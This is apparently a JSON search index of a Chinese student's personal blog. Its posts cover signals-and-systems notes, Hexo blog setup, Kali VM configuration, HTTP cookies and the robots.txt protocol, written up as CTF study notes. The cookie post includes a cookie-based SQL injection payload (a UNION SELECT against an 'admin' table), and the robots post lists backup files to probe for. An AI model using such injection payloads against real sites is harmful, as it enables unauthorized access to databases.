{"pages":[],"posts":[{"title":"信号与系统学习笔记（一）","text":"摘要：信号与系统的一些概念理解 一、LTI系统时域分析 LTI系统定义:$$T(\\sum_{k=k_1}^{k_2} a_kx_k(t-t_k))= \\sum_{k=k_1}^{k_2} a_ky_k(t-t_k)$$ 卷积：设某系统冲激响应为$h(t)$,即$\\delta(t)\\Rightarrow h(t)$ $f(t)*T(\\delta(t))=T(f(t))$，看作f(t)经过了系统h(t),系统冲激响应为$T(\\delta(t))$。$u(t)$为$\\delta(t)$经过积分器 因果性：系统输出只与输入的当前值和以前值有关，充要条件$$h(t)=h(t)u(t)$$$$y(t)=\\int_0^\\infty h(\\tau)x(t-\\tau)d\\tau$$因$\\tau&gt;0$，所以$x(t-\\tau)$只用到了x(t)之前的值 记忆系统：输出与输入过去值有关 $x_1(t)=cosw_0t,x_2(t)=e^{-t},y_1(t)=x’(t),y_2(t)=x^2(t)$ 流图表示：子系统对调 二、LTI特征分析 CNN : $x[n]*h[-n]$,边缘补零，计算反向传播时可用卷积的思想 矩阵特征值与特征向量：$$A\\vec{x}=λ\\vec{x}$$把A看作某种对x的几何变换，若A对x有作用不变性，则x为A的特征向量，对应系数为特征值。 系统特征值与特征函数：$$T(s(u))=λs(u)$$s(u)/T可看作无穷维向量/矩阵 LTI系统特征值与特征函数：$$y(t)=e^{jwt}\\int_{-\\infty}^{\\infty} h(\\tau)e^{-jw\\tau}d\\tau=e^{jwt}H(w)$$$s(t)=e^{jwt}是任意LTI系统的特征函数，H(w)为对应系统的特征值$ 复指数表示$e^{jwt}$是真正的单频率信号，而cos和sin在频谱上都有两条谱线，所以只有傅里叶变换才能用于信号成分分析，才有明确的物理意义,是无可替代的。 $e^{st}$是一般意义的LTI特征函数，s=a+jw可表示任何复数，而傅里叶的s只能表示纯虚数(系数不同)，H(s)为特征值。是更复杂的信号，但不是有确定物理意义的单频信号，所以Laplace变换在做系统变换时比傅里叶变换有更广泛的性质，但不能用于信号成分分析。 三、傅里叶级数 $L^2[t_0,t_a]$上的完备正交基：$$f(t)=\\sum_{n=-\\infty}^{\\infty} c_n\\varphi_n(t)$$$$&lt;f(t),\\varphi_k(t)&gt;=\\sum_{n=-\\infty}^{\\infty} c_n&lt;\\varphi(t),\\varphi_k(t)&gt;=c_k&lt;\\varphi_k(t),\\varphi_k(t)&gt;$$ 三角形式傅里叶级数正交基：$$\\frac{1}{\\sqrt{2}},coswt,sinwt,…,cosnwt,sinnwt$$$$&lt;\\varphi_k(t),\\varphi_k(t)&gt;=\\frac{T}{2}$$ 指数形式傅里叶级数正交基：{e^{jnwt}}$$&lt;\\phi_n(t),\\phi_n(t)&gt;=&lt;e^{jnwt},e^{jnwt}&gt;=T$$ 周期延拓 四、傅里叶变换 加窗 $Sa(\\frac{wT}{2})=\\frac{sin\\frac{wT}{2}}{\\frac{wT}{2}}$主瓣是$\\frac{2\\pi}{T}$ –第一个过零点 峰值点在$w_0$和$-w_0$位置，可用于谱分析 局限：有限长的窗带来的频率分辨率问题 如果$\\frac{2\\pi}{T}&lt;&lt;w_0$,即矩形里包含了$cosw_0t$的很多周期，$T\\rightarrow\\infty$时Sa趋向冲击，没问题。但主瓣有宽度，如果信号有两个正弦分量$w_0$和$w_1$，如果$w_0$和$w_1$的距离小于主瓣宽度，两个Sa的主瓣会重合，叠加成一个Sa,可能只在$w_0$和$w_1$中间出现一个峰值，这时就无法分辨出两个频率。 为了解决这个问题，要求窗长尽可能大，分辨率才好。 周期信号的傅里叶变换 周期信号本来是没有傅里叶变换的,($f(t)\\notin L^1(-\\infty,\\infty)$)。但可以通过主周期得到主周期的傅里叶变换，再得到F级数的系数与主周期的F变换的关系，从而得到完整周期的F变换。其傅里叶变换是一系列冲激串。 –F级数是F变换的特例 只有有限长信号或其延拓成的周期信号才有傅里叶级数，$F_n$表明在某个频点有确定的信号强度，信号强度的密度对应着冲激，即傅里叶变换。 高斯对高斯，冲激对冲激 五、离散信号傅里叶变换 离散信号的频率在离散信号中，w和$w+2\\pi k$不可区分，因为只看离散点n(整数)的值而非连续的t，如$sin((2\\pi k+w)n+\\phi)=sin(wn+\\phi)$。所以角频率主值取$[-\\pi,\\pi]$或$[0,2\\pi]$ 注意，在离散信号中，$\\pi$为最高频，0和$2\\pi$为最低频。(0和$2\\pi$不可区分) 正弦离散信号的周期$x[n]=cos(w_0n+\\phi)$,令$x[n+N]=x[n]$，则周期$N=\\frac{2\\pi}{w_0}k$,k取令N为整数的最小整数 注意：角频率越大，周期越小的结论不再成立 以N为周期的离散信号中，可区分的正弦频率数目只有N个 $$w_k=\\frac{2\\pi}{N}k,k=0,1,…,N-1$$ 离散信号的傅里叶级数DFS DTFT","link":"/2022/04/05/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"如何个性化定制个人博客","text":"摘要：一篇基于yarn,Hexo和Icarus主题的个性化定制个人博客的教程。以如何把Hexo默认主题更改为酷炫的赛博朋克风格为例，介绍了一些Icarus主题的功能强大的插件 前言搭建完博客后，可以定制个人的博客风格。本文将基于Icarus主题搭建赛博朋克风格的博客。 1.安装和配置必要依赖yarn安装直接使用npm命令即可，这样的前提是你已经安装了 Node.js 12node-v #检查是否具有node.jsnpm install -g yarn #安装yarn 安装完成之后可以通过yarn -v命令检测是否安装成功。然后我们设置一下yarn库的镜像源： 1yarn config set npmRegistryServer https://registry.npm.taobao.org 2.更换为 Icarus 主题我们查看 Icarus 文档,里面有英文文档也有中文文档。更换主题主要有两种方式，一种是使用 npm 安装主题的方式，另一种是下载源码放到 theme 文件夹的方式。简单起见，我们采用 npm 的方式： 1yarn add hexo-theme-icarus 使用 hexo 命令修改主题为 Icarus: 1npx hexo config theme icarus hexo g生成后，本地调试下，报错： 提示缺少依赖，就按照指示按照依赖： 1yarn add bulma-stylus@0.8.0 hexo-pagination@^2.0.0 hexo-renderer-inferno@^0.1.3 再次生成并本地调试，成功出现 Icarus 主题要更换为赛博朋克风格主题，只需在Hexo文件夹的_config.icarus.yml修改 12# Icarus theme variant, can be &quot;default&quot; or &quot;cyberpunk&quot;variant: cyberpunk 再次生成并本地调试，成功出现赛博朋克主题，用hexo d上传至服务器 3.自定义配置修改配置文件 _config.yml 和 _config.icarus.yml ，配置网站相关信息。主要包括 logo、favicon、navbar 的 menu 和 links、footer、donates、widgets。可参照Icarus用户指南 - 主题配置 widgets即为左侧和右侧的挂件，profile widgets是个人资料卡，里面的social_links的icon是基于fontawesome的。subscribe_email、adsense 都用不上，可以删掉。 Icarus还提供了分享和评论插件。设置参照Icarus用户指南 - 分享按钮和Icarus用户指南 - 用户评论插件,效果如下： 注意：评论插件需在github上创建一个新的repo来放置，且配置完成后要在个人主页上登录github进行初始化评论。 Icarus支持数学公式显示，只需在主题配置文件下修改； 12mathjax: enable: true 若无法显示，可能是没安装hexo-math： 1npm install hexo-math --save 4.配置样例文章注意头部配置文件相关信息，在新版 Icarus 中头图需要额外配置 cover 选项，如下： 1234567891011121314---title: 如何个性化个人博客date: 2022-04-08 23:05:51categories:- CS- Blogtags:- Hexo- Icarus- Blogtoc: truethumbnail: 'https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220409013048.png' # 缩略图cover: 'https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220409013048.png' # 头图--- 5.主页展示文章缩略首页应该展示更多的文章，我们想让用户在主页看文章缩略内容，只需用markdown在文章的md文件中添加 即可，文章会自动从插入的位置截断，也就是说在博客中只显示之前的内容。 添加完之后，会出现“阅读更多”的按钮。 6.怎么样让文章两栏展示为了有效利用空间，希望文章页能够不同于主页的三栏布局，使用两栏布局。或者想在文章页面使用不同于主页的挂件。此时我们需要在_config.yml同级文件夹添加 _config.post.yml 文件，参照配置文件与优先级 配置成两栏布局： 123456789101112widgets: - # Where should the widget be placed, left sidebar or right sidebar position: right type: toc # Whether to show the index of each heading index: false # Whether to collapse sub-headings when they are out-of-view collapsed: true # Maximum level of headings to show (1-6) depth: 3 7.部署到 GitHub Pages 上参照官网描述,在上一篇文章中已经部署。 注意在 _config.yml 中配置你的 GitHub Pages 对应的仓库地址，如： 1234deploy: type: git repository: git@github.com:zhangsx19/zhangsx19.github.io.git branch: master 总结Icarus 主题提供了丰富且功能强大的插件，能让我们实现炫酷的主题，从而个性化定制个人博客。 参考资料 Yarn 的安装与使用 轻松搭建赛博朋克风格个人博客 —— Hexo 篇｜技术点评","link":"/2022/04/08/%E5%A6%82%E4%BD%95%E4%B8%AA%E6%80%A7%E5%8C%96%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"title":"用HEXO从零开始搭建个人博客","text":"摘要：一篇如何使用Github Pages和Hexo搭建自己的个人博客的教程，里面介绍了如何使用和配置Hexo框架，如何将Hexo部署到自己的Github项目中，如何注册域名以及将自己的域名关联到Github Pages上。 前言一直想搭建一个属于自己的博客，一方面可以记录自己的学习成果和技术理解，一方面在面试中也是加分项。在此记录下首次搭建个人博客的踩坑之路。 一、技术选型1.为什么选择HEXO？博客生成技术分为静态和动态网站生成，考虑到静态相比动态生成，有如下优点： 1.内容存储为平面文件，因此不需要数据库 2.静态网站不需要动态服务器端处理 3.静态网站比动态网站超快，因为它们不需要服务器端处理或数据库访问 4.静态网站比任何动态网站都更安全，因为可以利用的安全漏洞更少 5.缓存静态文件比缓存动态页面更有效 所以本次使用静态生成，目前主流静态站点生成器有：Hexo和Hugo等，Hugo是一个用Go语言构建的静态站点生成器，其搭建较简单但可扩展性差。而Hexo是基于Node的开源静态生成器，有以下优点： 1.构建速度快 2.使用一个部署命令可部署到Github或其他任何主机 3.强大的Markdown支持 4.高度可扩展 5.丰富的开源主题与插件 基于此，本次采用Hexo进行博客搭建。 2.为什么选择Github-PagesGithub Pages是用户编写的、托管在github上的静态网页,优点有：1.可以绑定你的域名2.简单快捷，可以提供一个免费的服务器，免去了自己搭建服务器和写数据库的麻烦。 二、搭建步骤1.安装和配置必要框架Git安装去Git官网根据你的电脑参数，下载对应版本并安装。安装完成后在桌面或任意文件夹点击鼠标右键，会有Git GUI Here和Git Bash Here两个按钮，一个是图形界面的Git操作，一个是命令行。一般选择命令行操作Git Bash Here。 Node.js安装到官网根据电脑参数下载安装文件并执行，无脑点下一步即可，无需配置环境变量，完成安装。 Hexo安装与配置桌面右键鼠标，点击Git Bash Here，输入以下命令即可安装。 12npm install hexo-cli -g npm install hexo-deployer-git --save 第一句是安装hexo，第二句是安装hexo部署到git page的deployer，两个都需要安装。如下图即安装完成。 安装完成后，根据自己喜好创建一个Hexo文件夹(如D:\\Blog\\Hexo),进入创建的文件夹目录，右键鼠标，点击Git Bash Here，执行命令: 1hexo init Hexo 将在指定文件夹中新建所需要的初始化配置文件，如下图 123hexo clean #清理缓存hexo generate #进行渲染 简写为 hexo ghexo server #部署到本地(调试使用) 简写为 hexo s 终端中会出现INFO Hexo is running at http://localhost:4000/。此时在浏览器输入网址http://localhost:4000，即可查看本地的效果，如下图 此时个人博客初步创建成功，但这是本地调试用的，其他人看不到(调试完毕后记得在git命令行中Ctrl+C来停止运行，不然下次就进不去了)，所以接下来我们需要把它部署到服务器上，从而让每个人都能通过互联网访问到我们的个人博客。 2.将博客部署到Github-Pages上在Github中创建github.io项目代码库注意repository的名字必须是：你的用户名.github.io 将本地的Hexo文件更新到Github的库中打开创建的Hexo文件夹，修改配置文件_config.yml以后的大部分操作都会在_config.yml中进行，它是站点的配置文件。在Hexo文件夹下,右键鼠标，点击Git Bash Here,执行命令： 1234hexo clean #清理缓存hexo generate #进行渲染 简写为 hexo ghexo server #部署到本地 简写为 hexo s 可省略hexo deploy #部署到git服务器 简写为 hexo d 以上代码为了简单后续统称为“更新代码”，即每次在本地进行了操作（如修改了配置、新写或修改了博客文章等),都需执行“更新代码”来同步到git服务器，从而让别人浏览到。其中hexo s命令也可省略，即如果没有本地调试需求，可以直接commit到git服务器。如报错ERROR Deployer not found: git,deployer没有安装成功，需要执行如下命令再安装一次： 1npm install hexo-deployer-git --save 再执行hexo g -d，出现INFO Deploy done: git即部署成功，在浏览器上输入Github Pager为我们生成的外链：你的用户名.github.io（如zhangsx19.github.io），即可看到自己的博客，且每个人都可通过此地址访问到。 三、写第一个博客搭好博客后，进入创建的Hexo文件夹，使用如下命令来新建文章： 1hexo new post “文章名字” #简写为 hexo n &quot;文章名字&quot; 建立好的文章存储在./source/_posts 中，你可以在本地用markdown语法编辑内容。编辑完成后还需要执行“更新代码” 123hexo cleanhexo ghexo d #可与hexo g合并为 hexo d -g 再刷新浏览器就可看到新文章。如下图: 四、将域名关联到Github Pages(可选）1.域名购买如果不想用github提供的免费域名，可以选择在阿里云上买一个属于自己的域名，然后将自己域名绑定到自己的Github Pages博客上 2.域名解析购买域名并实名认证后，需要把域名解析到我们的博客中，在阿里云的域名控制台找到域名右侧对应的解析按钮。点击添加解析，然后按照如下填写添加解析，记得把记录值替换成你自己的博客地址。 之后记得启用该记录。 3.博客配置购买域名后，在Hexo\\source 文件夹下创建文件 CNAME （通过记事本创建和打开，没有后缀名），内容为你的域名，如sx-zhang.top。 然后在Hexo文件夹执行“更新代码”。 12hexo cleanhexo g -d 就可以通过购买的域名访问博客了。如果不能访问可能是因为运营商DNS缓存问题。等几分钟就可以。 五、实现https协议(可选）购买的域名是http协议，如果用google浏览器或者Safari，会提示网站不被信任，只有你点击仍要继续才会展示你的博客。而使用https协议就不会有这个问题，有以下方法： 购买证书 使用免费CA证书。腾讯云阿里云都有提供。不过有时间限制 使用CDN进行反向代理 因为我们使用的github Page是不支持上传证书的，所以此次使用第三种:通过CDN配置反向代理。 原理Cloudflare 提供DNS解析服务，而且速度很快。它提供了免费的https服务(但不是应用SSL证书)。实现模式是，用户到CDN服务器的连接为https，而CDN服务器到GithubPage服务器的连接为http，即在CDN服务器那里加上反向代理。 步骤去官网注册后添加购买的域名，进入DNS解析界面填入如下解析： 其中前两个是使你的域名指向github的服务器地址(github文档中给的)，最后CNAME记录指向的是github仓库域名username.github.io。一定要严格按照这个来配置。记录下cloudflare给你的DNS解析服务器，就在上一步那个页面下边，用这个记录去把阿里云的DNS解析服务器替换掉，同时删掉阿里云里面的DNS解析记录，因为只靠clouleflare来解析DNS。 回到clouldflare上面选择SSL/TLS的Overview选项，然后选择Full或者是Flexible。再在Edge Certificates里打开always use HTTPS开关。此时即可用https访问个人博客啦！ 坑点：博文不能有非https的链接，比如图片图床不能是https的，或者评论插件不支持https等 总结本文简单介绍了如何用Hexo框架从零开始搭建属于自己的个人博客，以及如何把购买的域名关联到Github Pages,并利用CDN配置反向代理实现https协议。搭建完博客后，接下来就是要个性化个人博客和学习Markdown来写博客了。 想了解更多，欢迎来参观我的博客：Zhangsx’s Blog 和github：zhangsx19 参考资料 hexo搭建博客以及域名解析分析 2018，你该搭建自己的博客了！ 关于HEXO搭建个人博客的点点滴滴","link":"/2022/04/04/%E7%94%A8HEXO%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"title":"kali虚拟机安装与配置","text":"摘要：本文实现了利用虚拟机从零开始安装和配置kali系统 前言做网络安全，一个好的操作系统是必不可少的，而kali则是最常用的用于渗透测试的操作系统。为了方便测试和还原，我选择用vmware安装kali系统的虚拟机，安装和配置过程踩了不少坑，特此记录。 一.安装和配置必要依赖VMWARE虚拟机即电脑中的电脑。每个虚拟机都有独立的CMOS、硬盘和操作系统，可以像使用实体机一样对虚拟机进行操作。在安装时，勾选增强型 如果是第一次安装，启动的时候会要求打开虚拟化的设置。可参照启动BIOS的虚拟化设置 123仅主机模式：本机与新安装的虚拟机互通，但是虚拟机与其他的虚拟机互通不了。NAT模式：本机与新安装的虚拟机互通，虚拟机与虚拟机之间也互通，但是外界访问不了你。桥接模式：本机与新安装的虚拟机互通，虚拟机与虚拟机之间也互通，外界也能访问你这个虚拟机。(直接连接物理网络) 快照是虚拟机最强大的功能，能够让你保留虚拟电脑的某一时刻。 –&gt; 存档的意思 远程连接首先要开启允许远程控制(Kali不像windows,默认是没有远程桌面服务的,如果需要的话得自己安装)，然后在主机运行栏输入mstsc，输入虚拟机ipv4地址(ipconfig查看,kali是ifconfig)。 Kalikali是基于Debian的Linux发行版本，前身是BackTrack，专门用于渗透测试和安全审计。特点： 123包含600+安全工具开源免费有图形化界面的Linux系统 简单来说，kali就是用工具对目标进行渗透测试的。 下载地址,推荐下载Kali Linux 64-Bit VMware VM(这个版本是专门用于Vmware)。(网页查找VMWARE即可)。解压后找到vmx文件用虚拟机打开。可以选择编辑虚拟机设置，把内存调高到4G。打开后选择我已移动该虚拟机(点复制有些工具可能会路径错误)。 还可以把快照的自动保护功能打开，即自动存档的意思。 开机输入默认的账户和密码，都为kali（2021.1以后和之前的老版本不同，只是一个普通用户,老版本为root用户，账户和密码均为root），最好拍个初始状态的快照，因为做出修改后虚拟机会自动保存，注意快照左下角显示需要等待一定时间。 如何删除虚拟机：选中要删除的虚拟机操作系统，单击右键，选择 “管理” 选项。然后在选择 “从磁盘中删除” 选项即可删除该虚拟机操作系统 二、设置root用户为了以后使用更加方便，这里我们可以直接更改root用户的密码，后续就可以用root用户登陆了切换到root权限：sudo su 打开终端，输入命令：sudo passwd root 提示输入kali用户的密码，kali的默认密码为kali。接下来输入新密码，输入两遍新密码之后，root用户的密码成功修改。接下来可以重启kali 用root用户登录，并且输入上面步骤的新密码。重启命令：sudo reboot 三、设置中文（1）设置中文编码命令：dpkg-reconfigure locales 进入选择语言的图形化界面之后，（空格是选择，Tab是切换）选中 en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8、zh_CN.GBK，图为初始界面，界面下选项，可以下拉，排序为从a-z排序。 回车之后，会让你设置默认编码，设置成zh_CN.UTF-8，回车。 注意：重启后要选择保留旧的名称，方便以后的配置。 （2）配置源不然下载软件的时候会比较慢，源可以理解为软件的仓库 做一下备份：sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup,如果以后源列表无意毁坏了，可以恢复一下:sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list 打开源文件：vim /etc/apt/sources.list。此时文件里面只有一个官方源，建议注释，不然还是会使用这个源。vi和vim都是Linux中的编辑器，vi使用于文本编辑,但是vim适用于coding和文本。 推荐源： 12345# kali官方源deb http://http.kali.org/ moto main non-free contribdeb-src http://http.kali.org/ moto main non-free contribdeb http://security.kali.org/ moto/updates main contrib non-freedeb-src http://security.kali.org/ moto/updates main contrib non-free 按i 进入插入模式，可以把上述的源都复制进去。然后按esc，再按shift+冒号，输入wq保存。 接着更新源，命令： 12345apt-get update #更新一下源sudo apt-get dist-upgrade -y #更新系统和软件#这里最好快照一下sudo apt-get autoremove -y #清理安装包reboot #重启 更新源时，如果出现以下错误，换个源 如果中间出错了，会提示执行apt --fix-broken install,再执行即可。 （apt-get，是一条linux命令，适用于deb包管理式的操作系统） 更新好就会有这个，选择yes （3）安装中文输入法命令：apt-get install fcitx fcitx.googlepinyin,重启后在搜索框搜索“fcitx”,点击“fcitx配置”程序，将Google输入法调在第一位即可 切换：ctrl+空格 （4）安装中文字体如果使用chrome浏览器,发现中文显示全是方框。而系统自带的firefox却没有这个问题,原因是系统缺少相应的字体库支持 命令：sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy安装完后输入sudo reboot重启，记得在登陆界面选择中文，再登陆,则汉化完成。 5）浏览器改为中文kali默认浏览器是网络浏览器，点击search for more languages;select a language to add,找到Chinese(China),点击add。 6）浏览器安装插件在扩展和主题里，安装omega代理插件，应用选项如下 三、安装JDK1.8并且切换(不一定要切换)kali默认的java版本是，版本过高不太稳定，较稳定的版本是JDK1.8。 先把包拖进虚拟机 12解压安装包：tar -axvf jdk-8u311-linux-x64.tar.gz将文件移动到opt目录再改名为java：mv ./jdk1.8.0_311 /opt/java 编辑：vi /etc/profile export JAVA_HOME=/opt/java export PATH=$PATH:$JAVA_HOME/bin export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export JRE_HOME=$JAVA_HOME/jre 1234567更新：source /etc/profile更新完后会出现#,关掉终端，再打开一个命令行切换：update-alternatives --install /usr/bin/java java /opt/java/bin/java 3update-alternatives --config java #切换回去也是这条命令选择1java -version #查看版本 四、安装梯子注：主机和虚拟机不共享梯子权限。 五、踩过的坑1.更新时卡住了，只能退出重来，结果提示12E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it? 这些错误提示一般都是因为某些程序在系统后台进行着某些 apt 操作，因此锁定了 apt 数据库，所以暂时不能进行 apt 操作。 遇到这种情况，一般我们只需要安静地等待几分钟。直到当前的更新、安装或卸载任务完成后，锁就会自动释放，然后就可以进行 apt 操作了。 非正常情况下，比方说你等了好多个几分钟锁都还没有被释放，你就要看看是不是该进程由于某些原因而卡住了并且一直占用着锁。如果是的话，那你只能干掉这个进程，然后删除该锁定了 首先，我们先找出是哪个进程占用了锁文件 /var/lib/dpkg/lock 1sudo lsof /var/lib/dpkg/lock-frontend #sudo lsof 文件 我们可以从结果中看到，该进程的 PID 为 1548。接着，kill 掉这个进程 1sudo kill -9 1548 然后你就可以放心地删除锁文件 123sudo rm /var/lib/dpkg/locksudo rm /var/cache/apt/archives/lock #删除缓存目录下的锁文件sudo dpkg --configure -a 2.更新源时release仓库过期首先确保虚拟机与主机的时间是同步的(虚拟机-设置-选项-VMWARE TOOLS)，如果还是不行，可能是长时间挂着虚拟机，时间不同步了，只需重启下即可 总结经历千辛万苦终于安装和配置成功，接下来就开始渗透的学习了。 参考资料1.kali2021.4软件更新以及输入法安装 2.更新卡住解决_Linux安装软件时90%的人会遇到这个报错，如何解决？","link":"/2022/04/10/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"},{"title":"http中的cookie","text":"摘要：本文介绍了http中的cookie是什么 前言做XCTF时遇到了cookie,特此记录。 零、http和https协议1.静态Web和动态Web的区别输入，静态Web常用来阅读资料的，而动态Web可以根据【用户输入内容】的不同返回不同的结果。（交互式的） 2.前后端交流过程当我们输入完域名的时候，浏览器会拿着我们的域名向服务器发起一个请求，服务器拿到这个请求之后，会返回一个响应，浏览器拿到响应之后就会渲染一个页面。 3.Web攻击面Network（网络层）、OS（操作系统）、Web Server（中间件）、App Server（app之类的漏洞）、Web Application（网站）、Database（数据库方面的漏洞）、Browser（浏览器方面的漏洞） 4.HTTP和HTTPS的区别12HTTP：①.无状态。②.明文传输HTTPS = HTTP +SSL：最大的区别就是加密 5.加密123对称加密：同一种加密方式，同一种解密方式非对称加密：加密方式是一种，解密方式是另外一种。公钥加密，私钥解密 客户端与服务器端通信的加密过程：当我们输入完域名的时候，浏览器会拿着我们的域名向服务器发起一个请求，再发起请求之前，服务器端会先发送一个公钥给客户端，浏览器会拿到这个公钥根据自己的算法去生成一个对称密钥，接下来客户端与服务器端之间的通信数据都会被对称密钥进行加密，然后对称密钥会被公钥进行加密，一起发送给服务器端，服务器端收到了请求后，首先会拿私钥把对称密钥进行解密，得到了对称密钥再对传输的数据进行解密。 一、cookie的定义Cookie，有时也用其复数形式 Cookies。Cookie是由服务器端生成，发送给User-Agent,浏览器会将Cookie的key/value保存到某个目录下的文本文件内，如网站根目录下的cookie.php,下次请求同一网站时就发送该Cookie给服务器 一句话，cookie=用户身份 二、cookie的作用HTTP cookie就是服务器端发送给浏览器端的一小部分数据，浏览器接收到这个数据之后，可以存起来自己用，也可以在后续发送到server端进行一些数据的校验。 Cookie诞生的最初目的是为了存储web中的状态信息，以方便服务器端使用。比如判断用户是否是第一次访问网站。 又如通过在cookies中存储一些有用的数据，可以将无状态的HTTP协议变成有状态的session连接，或者用来保存登录的权限，下次不用密码即可登陆，非常有用。一般来说，cookies用在三个方面： 123- session的管理，用来保存登录状态，从而让HTTP请求可以带上状态信息。- 用户自定义的设置，这些用户特殊的字段，需要保存在cookies中。- 跟踪用户的行为信息。 在很久很久以前，还没有现代浏览器的时候，客户端的唯一存储就是cookies，所以cookies也作为客户端存储来使用的，但是有了现代的浏览器之后，一般是建议把客户端存储的数据放到其他存储方式中。为什么呢？因为每次请求cookies中的数据会自动带上，并且发送到server端，所以如果cookies中存储了太多的数据，就会导致服务器性能的下降。 三、cookie注入当你使用Cookie进行传参的时候 ，传参的值一定要进行URL编码的。默认浏览器是会URL编码的。 空格–&gt; %20 如果用的数据库是ACCESS，语法比较正规(select后一定要有from即要先找到一个表名)b9a2a2b5dffb918c -&gt; md5解码-&gt; welcome 12escape() # 函数，作用：进行URL编码document.cookie = &quot;id=&quot; + escape(&quot;171 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin&quot;) 四、解题 总结学习了http中的cookies 参考资料 HTTP系列之:HTTP中的cookies 好好了解一下Cookie(强烈推荐)","link":"/2022/04/09/http%E4%B8%AD%E7%9A%84cookie%E4%B8%8Ecookie%E6%B3%A8%E5%85%A5/"},{"title":"Robots协议是什么","text":"摘要：本文介绍了Robots协议是什么，以及如何利用urllib的robotparser模块，实现网站Robots协议的分析 前言做XCTF时遇到了Robots协议,特此记录。 一、前置内容1.区分进程和线程进程是cpu资源分配的最小单位（是能拥有资源和独立运行的最小单位） 线程是cpu调度的最小单位（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）。单线程与多线程，都是指在一个进程内的单和多。 12345- 进程是一个工厂，工厂有它的独立资源- 工厂之间相互独立- 线程是工厂中的工人，多个工人协作完成任务- 工厂内有一个或多个工人- 工人之间共享空间 12345- 工厂的资源 -&gt; 系统分配的内存（独立的一块内存）- 工厂之间的相互独立 -&gt; 进程之间相互独立- 多个工人协作完成任务 -&gt; 多个线程在进程中协作完成任务- 工厂内有一个或多个工人 -&gt; 一个进程由一个或多个线程组成- 工人之间共享空间 -&gt; 同一进程下的各个线程之间共享程序的内存空间（包括代码段、数据集、堆等） 2.浏览器是多进程的浏览器之所以能够运行，是因为系统给它的进程分配了资源（cpu、内存） 简单点理解，每打开一个Tab页，就相当于创建了一个独立的浏览器进程。如果再多打开一个Tab页，进程正常会+1以上 注意：在这里浏览器应该也有自己的优化机制，有时候打开多个tab页后，可以在Chrome任务管理器中看到，有些进程被合并了 （所以每一个Tab标签对应一个进程并不一定是绝对的） 3.浏览器有哪些进程1234-浏览器主进程：只有一个，主要控制页面的创建、销毁、网络资源管理、下载等。-浏览器渲染进程(浏览器内核)：每个Tab页对应一个进程，互不影响。-第三方插件进程：每一种类型的插件对应一个进程，仅当使用该插件时才创建。-GPU进程：最多一个，用于3D绘制等。 4.输入网址并解析这里我们只考虑输入的是一个URL结构字符串，如果是非 URL 结构的字符串，则会用浏览器默认的搜索引擎搜索该字符串。 输入URL后，浏览器会解析出协议、主机、端口、路径等信息，并构造一个HTTP请求。(两次命中看缓存) 123-浏览器发送请求前，根据请求头的expires和cache-control判断是否命中（包括是否过期）强缓存策略，如果命中，直接从缓存获取资源，并不会发送请求。如果没有命中，则进入下一步。-没有命中强缓存规则，浏览器会发送请求，根据请求头的If-Modified-Since和If-None-Match判断是否命中协商缓存，如果命中，直接从缓存获取资源。如果没有命中，则进入下一步。-如果前两步都没有命中，则直接从服务端获取资源。 5.HSTS由于安全隐患，会使用 HSTS 强制客户端使用 HTTPS 访问页面。详见：你所不知道的 HSTS。当你的网站均采用 HTTPS，并符合它的安全规范，就可以申请加入 HSTS 列表，之后用户不加 HTTPS 协议再去访问你的网站，浏览器都会定向到 HTTPS。无论匹配到没有，都要开始 DNS 查询工作了。 6.DNS域名解析在发起http请求之前，浏览器首先要做去获得我们想访问网页的IP地址，(如百度的IP是202.108.22.5，在浏览器中输入https://baidu.com和http://202.108.22.5是等价的）浏览器会发送一个UDP的包给DNS域名解析服务器 7.备份文件名常用的备份文件名有.git,.svn,.swp,.~,.bak,.bash_history 二、robots协议Robots协议也称作爬虫协议、机器人协议，它的全名叫作网络爬虫排除标准（Robots Exclusion Protocol），用来告诉爬虫和搜索引擎哪些页面可以抓取，哪些不可以抓取。它通常是一个叫作robots.txt的文本文件，一般放在网站的根目录下。 当搜索爬虫访问一个站点时，它首先会检查这个站点根目录下是否存在robots.txt文件，如果存在，搜索爬虫会根据其中定义的爬取范围来爬取。如果没有找到这个文件，搜索爬虫便会访问所有没有被口令保护的页面。 如下是一个robots.txt的样例： 123User-agent: *Disallow: /Allow: /public/ 上面的User-agent描述了搜索爬虫的名称，这里将其设置为*则代表该协议对任何爬取爬虫有效。 Disallow指定了不允许抓取的目录，比如上例子中设置为/则代表不允许抓取所有页面。 三、robotparser以简书为例，首先创建RobotFileParser对象，然后通过set_url()方法设置了robots.txt的链接。接着利用can_fetch()方法判断了网页是否可以被抓取。 12345from urllib.robotparser import RobotFileParserrp = RobotFileParser()rp.set_url('http://www.jianshu.com/robots.txt')rp.read()print(rp.can_fetch('*', 'http://www.jianshu.com/search?q=python&amp;page=1&amp;type=collections')) 四、解题1.思路1 2.思路2利用direarch目录扫描工具暴力破解，扫到有robots.txt总结学习了robots协议和python爬虫的robotparser类。 参考资料 从输入URL开始建立前端知识体系 【Python3网络爬虫开发实战】3.1.4-分析Robots协议 从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理","link":"/2022/04/09/Robots%E5%8D%8F%E8%AE%AE%E6%98%AF%E4%BB%80%E4%B9%88/"},{"title":"CSRF漏洞","text":"摘要：本文介绍了CSRF漏洞的定义和攻击方法 前言 一.安装和配置必要依赖 总结 